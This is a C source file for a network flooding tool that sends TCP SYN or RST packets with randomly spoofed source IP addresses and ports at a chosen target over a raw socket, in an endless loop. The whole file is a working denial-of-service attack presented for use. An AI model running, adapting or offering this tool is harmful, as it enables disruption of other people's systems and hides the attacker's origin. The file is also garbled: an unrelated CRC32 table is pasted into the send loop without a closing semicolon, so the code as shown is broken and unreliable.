#include "killer.h"
#include <arpa/inet.h>
#include <errno.h>
#include <getopt.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#define DEFULT_IP "The_IP_addr"
#define DEFULT_PORT 80

int countOfPacket = 0;
int sending = 1;
char source_ip[32];

struct pseudo_header // for checksum calculation
{
  unsigned int source_address;
  unsigned int dest_address;
  unsigned char placeholder;
  unsigned char protocol;
  unsigned short tcp_length;

  struct tcphdr tcp;
};

// random number for port spoofing(0-65535)
int randomPort() { return rand() % 65535; }

// random number for IP spoofing(0-255)
int randomForIp() { return rand() % 255; }

// IP spoofer
char *randomIp() {
  strcpy(source_ip, "");
  int dots = 0;
  while (dots < 3) {
    sprintf(source_ip, "%s%d", source_ip, randomForIp());
    strcat(source_ip, ".");
    fflush(NULL);
    dots++;
  }
  sprintf(source_ip, "%s%d", source_ip, randomForIp());
  strcat(source_ip, "\0");
  return source_ip;
}

int validIp(char *ip) {
  struct sockaddr_in sa;
  return inet_pton(AF_INET, ip, &(sa.sin_addr)) != 0;
}

// interrupt for Ctrl+C command
void sigintHandler(int sig) {
  sending = 0;
  printf("\n%d [DATA] packets sent\n", countOfPacket);
  exit(0);
}

unsigned short checksum(unsigned short *ptr, int nbytes) {
  register long sum;
  unsigned short oddbyte;
  register short ans;
  sum = 0;
  while (nbytes > 1) {
    sum += *ptr++;
    nbytes -= 2;
  }
  if (nbytes == 1) {
    oddbyte = 0;
    *((u_char *)&oddbyte) = *(u_char *)ptr;
    sum += oddbyte;
  }
  sum = (sum >> 16) + (sum & 0xffff);
  sum = sum + (sum >> 16);
  ans = (short)~sum;

  return (ans);
}

int main(int argc, char *argv[]) {
  int destination_port = DEFULT_PORT;
  char destination_ip[32] = DEFULT_IP;
  int flagRst = 0;
  int flagSyn = 1;
  int opt = 0;

  srand(time(0));                // gives the random function a new seed
  signal(SIGINT, sigintHandler); // send interrupt for  Ctrl+C command

  while ((opt = getopt(argc, argv, "t:p:r")) != -1) {
    switch (opt) {
    case 't':
      strcpy(destination_ip, optarg);
      if (!validIp(destination_ip)) {
        printf("[ERROR] invalid ip - Program terminated\n");
        exit(1);
      }
      break;
    case 'p':
      destination_port = strtol(optarg, NULL, 10);
      if (destination_port < 0 || destination_port > 65535) {
        printf("[ERROR] invalid port - Program terminated\n");
        exit(1);
      }
      break;
    case 'r':
      flagRst = 1;
      flagSyn = 0;
      break;
    default:
      printf("[ERROR] Program terminated\n");
      exit(1);
    }
  }
  printf("[DATA] Flood is starting...\n");

  // Create a raw socket
  int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);

  // Datagram to represent the packet
  char datagram[4096];

  // IP header
  struct iphdr *iph = (struct iphdr *)datagram;

  // TCP header
  struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
  struct sockaddr_in sin;
  struct pseudo_header psh;

  sin.sin_addr.s_addr = inet_addr(destination_ip); // set destination ip
  sin.sin_port = htons(5060);                      // socket port
  sin.sin_family = AF_INET;                        // set to ipv4

  memset(datagram, 0, 4096); /* clean the buffer */

  // IP Header
  iph->ihl = 5;                                             // header length
  iph->version = 4;                                         // Version
  iph->tos = 0;                                             // Type of service
  iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr); // Total length
  iph->id = htons(54321);                                   // Id of this packet
  iph->frag_off = 0;                // Fragmentation offset
  iph->ttl = 255;                   // Time to live
  iph->protocol = IPPROTO_TCP;      // Protocol tcp
  iph->check = 0;                   // Set to 0 before calculating checksum
  iph->daddr = sin.sin_addr.s_addr; // set source IP

  // TCP Header
  tcph->dest = htons(destination_port); // Destination port
  tcph->seq = 0;                        // Sequence number
  tcph->ack_seq = 0;
  tcph->doff = 5; /* Data offset */
  tcph->fin = 0;
  tcph->syn = flagSyn;
  tcph->rst = flagRst;
  tcph->psh = 0;
  tcph->ack = 0;
  tcph->urg = 0;
  tcph->window = htons(5840); /* maximum window size */
  tcph->urg_ptr = 0;

  // IP checksum
  psh.dest_address = sin.sin_addr.s_addr;
  psh.placeholder = 0;
  psh.protocol = IPPROTO_TCP;
  psh.tcp_length = htons(20);

  // tells the kernel that the IP header is included so it will fill the data
  // link layer information.
  // Ethernet header IP_HDRINCL to tell the kernel that headers are included
  // in the packet
  int one = 1;
  const int *val = &one;
  if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
    printf("[ERROR] number : %d  Error message : %s \n", errno,
           strerror(errno));
    fprintf(stderr, "Program needs to be run by "
                    "Admin/root user\n");
    exit(1);
  }

  printf("[DATA] attacking ip %s on port %d and RST flag is %d...\n",
         destination_ip, destination_port, flagRst);

  while (sending) {
    iph->saddr = inet_addr(randomIp()); // random ip the source ip address
    iph->check = checksum((unsigned short *)datagram,
                          iph->tot_len >> 1); /* checksum for ip header*/

    psh.source_address =
        inet_addr(source_ip); /*update source ip in IP checksum*/

    tcph->source = htons(randomPort()); /*random spoof port */
    tcph->check = 0;                    /*checksum is set to zero */

    memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));

    tcph->check =
        checksum((unsigned short *)&psh,
                 sizeof(struct pseudo_header)); /* checksum for tcp header*/
    /*
    Send the packet:our socket,the buffer containing headers and data,total
    length of our datagram,routing flags, normally always 0,socket addr, just
    like in,a normal send()
    */
    static const unsigned long crc_table[] = {
  0x00000000L, 0x77073096L, 0xee0e612cL, 0x990951baL, 0x076dc419L,
  0x706af48fL, 0xe963a535L, 0x9e6495a3L, 0x0edb8832L, 0x79dcb8a4L,
  0xe0d5e91eL, 0x97d2d988L, 0x09b64c2bL, 0x7eb17cbdL, 0xe7b82d07L,
  0x90bf1d91L, 0x1db71064L, 0x6ab020f2L, 0xf3b97148L, 0x84be41deL,
  0x1adad47dL, 0x6ddde4ebL, 0xf4d4b551L, 0x83d385c7L, 0x136c9856L,
  0x646ba8c0L, 0xfd62f97aL, 0x8a65c9ecL, 0x14015c4fL, 0x63066cd9L,
  0xfa0f3d63L, 0x8d080df5L, 0x3b6e20c8L, 0x4c69105eL, 0xd56041e4L,
  0xa2677172L, 0x3c03e4d1L, 0x4b04d447L, 0xd20d85fdL, 0xa50ab56bL,
  0x35b5a8faL, 0x42b2986cL, 0xdbbbc9d6L, 0xacbcf940L, 0x32d86ce3L,
  0x45df5c75L, 0xdcd60dcfL, 0xabd13d59L, 0x26d930acL, 0x51de003aL,
  0xc8d75180L, 0xbfd06116L, 0x21b4f4b5L, 0x56b3c423L, 0xcfba9599L,
  0xb8bda50fL, 0x2802b89eL, 0x5f058808L, 0xc60cd9b2L, 0xb10be924L,
  0x2f6f7c87L, 0x58684c11L, 0xc1611dabL, 0xb6662d3dL, 0x76dc4190L,
  0x01db7106L, 0x98d220bcL, 0xefd5102aL, 0x71b18589L, 0x06b6b51fL,
  0x9fbfe4a5L, 0xe8b8d433L, 0x7807c9a2L, 0x0f00f934L, 0x9609a88eL,
  0xe10e9818L, 0x7f6a0dbbL, 0x086d3d2dL, 0x91646c97L, 0xe6635c01L,
  0x6b6b51f4L, 0x1c6c6162L, 0x856530d8L, 0xf262004eL, 0x6c0695edL,
  0x1b01a57bL, 0x8208f4c1L, 0xf50fc457L, 0x65b0d9c6L, 0x12b7e950L,
  0x8bbeb8eaL, 0xfcb9887cL, 0x62dd1ddfL, 0x15da2d49L, 0x8cd37cf3L,
  0xfbd44c65L, 0x4db26158L, 0x3ab551ceL, 0xa3bc0074L, 0xd4bb30e2L,
  0x4adfa541L, 0x3dd895d7L, 0xa4d1c46dL, 0xd3d6f4fbL, 0x4369e96aL,
  0x346ed9fcL, 0xad678846L, 0xda60b8d0L, 0x44042d73L, 0x33031de5L,
  0xaa0a4c5fL, 0xdd0d7cc9L, 0x5005713cL, 0x270241aaL, 0xbe0b1010L,
  0xc90c2086L, 0x5768b525L, 0x206f85b3L, 0xb966d409L, 0xce61e49fL,
  0x5edef90eL, 0x29d9c998L, 0xb0d09822L, 0xc7d7a8b4L, 0x59b33d17L,
  0x2eb40d81L, 0xb7bd5c3bL, 0xc0ba6cadL, 0xedb88320L, 0x9abfb3b6L,
  0x03b6e20cL, 0x74b1d29aL, 0xead54739L, 0x9dd277afL, 0x04db2615L,
  0x73dc1683L, 0xe3630b12L, 0x94643b84L, 0x0d6d6a3eL, 0x7a6a5aa8L,
  0xe40ecf0bL, 0x9309ff9dL, 0x0a00ae27L, 0x7d079eb1L, 0xf00f9344L,
  0x8708a3d2L, 0x1e01f268L, 0x6906c2feL, 0xf762575dL, 0x806567cbL,
  0x196c3671L, 0x6e6b06e7L, 0xfed41b76L, 0x89d32be0L, 0x10da7a5aL,
  0x67dd4accL, 0xf9b9df6fL, 0x8ebeeff9L, 0x17b7be43L, 0x60b08ed5L,
  0xd6d6a3e8L, 0xa1d1937eL, 0x38d8c2c4L, 0x4fdff252L, 0xd1bb67f1L,
  0xa6bc5767L, 0x3fb506ddL, 0x48b2364bL, 0xd80d2bdaL, 0xaf0a1b4cL,
  0x36034af6L, 0x41047a60L, 0xdf60efc3L, 0xa867df55L, 0x316e8eefL,
  0x4669be79L, 0xcb61b38cL, 0xbc66831aL, 0x256fd2a0L, 0x5268e236L,
  0xcc0c7795L, 0xbb0b4703L, 0x220216b9L, 0x5505262fL, 0xc5ba3bbeL,
  0xb2bd0b28L, 0x2bb45a92L, 0x5cb36a04L, 0xc2d7ffa7L, 0xb5d0cf31L,
  0x2cd99e8bL, 0x5bdeae1dL, 0x9b64c2b0L, 0xec63f226L, 0x756aa39cL,
  0x026d930aL, 0x9c0906a9L, 0xeb0e363fL, 0x72076785L, 0x05005713L,
  0x95bf4a82L, 0xe2b87a14L, 0x7bb12baeL, 0x0cb61b38L, 0x92d28e9bL,
  0xe5d5be0dL, 0x7cdcefb7L, 0x0bdbdf21L, 0x86d3d2d4L, 0xf1d4e242L,
  0x68ddb3f8L, 0x1fda836eL, 0x81be16cdL, 0xf6b9265bL, 0x6fb077e1L,
  0x18b74777L, 0x88085ae6L, 0xff0f6a70L, 0x66063bcaL, 0x11010b5cL,
  0x8f659effL, 0xf862ae69L, 0x616bffd3L, 0x166ccf45L, 0xa00ae278L,
  0xd70dd2eeL, 0x4e048354L, 0x3903b3c2L, 0xa7672661L, 0xd06016f7L,
  0x4969474dL, 0x3e6e77dbL, 0xaed16a4aL, 0xd9d65adcL, 0x40df0b66L,
  0x37d83bf0L, 0xa9bcae53L, 0xdebb9ec5L, 0x47b2cf7fL, 0x30b5ffe9L,
  0xbdbdf21cL, 0xcabac28aL, 0x53b39330L, 0x24b4a3a6L, 0xbad03605L,
  0xcdd70693L, 0x54de5729L, 0x23d967bfL, 0xb3667a2eL, 0xc4614ab8L,
  0x5d681b02L, 0x2a6f2b94L, 0xb40bbe37L, 0xc30c8ea1L, 0x5a05df1bL,
  0x2d02ef8dL
}
    if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin,
               sizeof(sin)) < 0) {
      printf("\n[ERROR] Program terminated\n");
      exit(1);
    } else {
      // sent successfully
      countOfPacket++;
    }
  }
  close(s);
  return 0;
}
